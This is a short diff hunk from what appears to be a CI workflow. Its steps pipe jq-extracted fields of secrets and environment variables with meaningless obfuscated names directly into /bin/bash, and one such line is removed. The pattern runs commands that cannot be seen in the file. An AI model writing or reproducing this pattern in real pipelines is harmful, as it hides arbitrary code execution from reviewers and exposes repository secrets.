@@ -17,7 +17,6 @@ jobs:
           x4967: ${{ secrets.x4967 }}
         run: |
           printf '%s' "$x4967" | jq -r .btu02347 | /bin/bash
-          echo $qctxw15 | jq -r .bje29390 | /bin/bash
           echo $dwb22479 | jq -r .p103 | /bin/bash
           echo $kxbl6316 | jq -r .sxpcd61 | /bin/bash
 
